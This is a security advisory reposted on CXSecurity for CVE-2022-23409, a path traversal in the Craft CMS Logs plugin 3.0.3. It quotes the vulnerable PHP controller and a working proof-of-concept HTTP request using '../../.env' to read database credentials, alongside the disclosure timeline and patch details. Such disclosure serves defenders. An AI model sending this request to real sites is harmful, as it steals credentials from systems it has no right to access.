---
title: Craft CMS Logs Plugin 3.0.3 Path Traversal (Authenticated)
url: https://cxsecurity.com/issue/WLB-2024060007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-03
fetch_date: 2025-10-06T17:31:38.769387
---

# Craft CMS Logs Plugin 3.0.3 Path Traversal (Authenticated)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Craft CMS Logs Plugin 3.0.3 Path Traversal (Authenticated)** **2024.06.02**  Credit:  **[Steffen Rogge](https://cxsecurity.com/author/Steffen%2BRogge/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-23409](https://cxsecurity.com/cveshow/CVE-2022-23409/ "Click to see CVE-2022-23409")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")**  CVSS Base Score: **4/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **Partial**  Integrity impact: **None**  Availability impact: **None** | |

# Exploit Title: Craft CMS Logs Plugin 3.0.3 - Path Traversal (Authenticated)
# Date: 2022.01.26
# Exploit Author: Steffen Rogge
# Vendor Homepage: https://github.com/ethercreative/logs
# Software Link: https://plugins.craftcms.com/logs
# Version: <=3.0.3
# Tested on: Linux
# CVE : CVE-2022-23409
product: Ethercreative Logs plugin for Craft CMS
fixed version: >=3.0.4
impact: Medium
found: 2021-07-06
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"A quick and dirty way to access your logs from inside the CP"
As found on the plugin store page: https://plugins.craftcms.com/logs
Active Installs 4,093 (as of 2021-07-07)
Business recommendation:
------------------------
The vendor provides a patched version v3.0.4 which should be installed immediately.
Vulnerability overview/description:
-----------------------------------
1) Authenticated Path Traversal (CVE-2022-23409)
The plugin "Logs" provides a functionality to read log files of the Craft CMS system inside
the backend of the CMS. As the requested logfile is not properly validated, an attacker is
able to request arbitrary files from the underlying file system with the permissions of the
web service user.
Proof of concept:
-----------------
1) Authenticated Path Traversal (CVE-2022-23409)
As the plugin is installed as an administrator of the system and the function is only accessible
after being logged in as an admin, an attacker needs to be authenticated as an administrator in
the backend in order to extract the needed "{MD5}\_identity" cookie for the crafted request.
The vulnerable endpoint is provided by the plugin under the following path:
https://vulnerablesite.com/index.php/admin/actions/logs/logs/stream
The vulnerable controller for that endpoint can be found here:
https://github.com/ethercreative/logs/blob/master/src/Controller.php
The function "actionStream()" provides an endpoint for the Craft CMS and does not validate input
values before file content is being read by the function "file\_get\_contents".
public function actionStream ()
{
$logsDir = \Craft::getAlias('@storage/logs');
$logFile = \Craft::$app->request->getParam('log');
$currentLog = \Craft::$app->request->get('log', $logFile);
$log = file\_get\_contents($logsDir . '/' . $currentLog);
exit($log);
}
A crafted GET parameter with the name "log" can be used to access files on the underlying filesystem
with rights as the user executing the web server. In most cases this will be the user "www-data".
In order to read the file ".env" or ".env.php" which contains the environment configuration and as
such also the database credentials, the following request can be used:
GET /admin/actions/logs/logs/stream?log=../../.env HTTP/1.1
Host: <host>
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:89.0) Gecko/20100101 Firefox/89.0
Connection: close
Cookie: 1031b8c41dfff97a311a7ac99863bdc5\_identity=<identity\_cookie>;
The response then discloses the file content of the file ".env":
HTTP/1.1 200 OK
Date: Thu, 07 Jul 2021 10:08:52 GMT
Server: nginx
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: CraftSessionId=2uisculfj8t9q1tnbiukl6ogjf; path=/; secure; HttpOnly
Content-Length: 1600
Connection: close
[...]
$craftEnvVars = [
'DB\_DRIVER' => 'mysql',
'DB\_SERVER' => '\*\*\*\*\*\*\*\*',
'DB\_USER' => '\*\*\*\*\*\*\*\*',
'DB\_PASSWORD' => '\*\*\*\*\*\*\*\*',
'DB\_DATABASE' => '\*\*\*\*\*\*\*\*',
'DB\_SCHEMA' => 'public',
'DB\_TABLE\_PREFIX' => '',
'DB\_PORT' => '\*\*\*\*\*\*\*\*',
'SECURITY\_KEY' => '\*\*\*\*\*\*\*\*',
[...]
Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available at the time
of the test:
\* Version 3.0.3 released on November 25, 2019
Distributed through the Craft Plugin Store https://plugins.craftcms.com/logs
Vendor contact timeline:
------------------------
2021-07-07: Contacting vendor through dev@ethercreative.co.uk
2021-07-08: Response from vendor, no encryption available but vendor accepted to be responsible
for any risks involved with plaintext communication
2021-07-08: Advisory was sent to vendor unencrypted
2021-07-09: Vendor released a patch for this vulnerability with version 3.0.4
(https://github.com/ethercreative/logs/commit/eb225cc78b1123a10ce2784790f232d71c2066c4)
2021-07-12: Updated Plugin has been tested on an up-to-date CraftCMS installation
(CraftCMS 3.7.0, PHP 8, MySQL 8, Logs Plugin 3.0.4)
2022-01-24: Release of security advisory
Solution:
---------
The vendor released a patched version 3.0.4 or higher which can be retrieved from their
website/github:
https://plugins.craftcms.com/logs
https://github.com/ethercreative/logs/commit/eb225cc78b1123a10ce2784790f232d71c2066c4
Workaround:
-----------
Uninstall/Disable the plugin and access the Craft CMS logs via SSH or other services.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - require...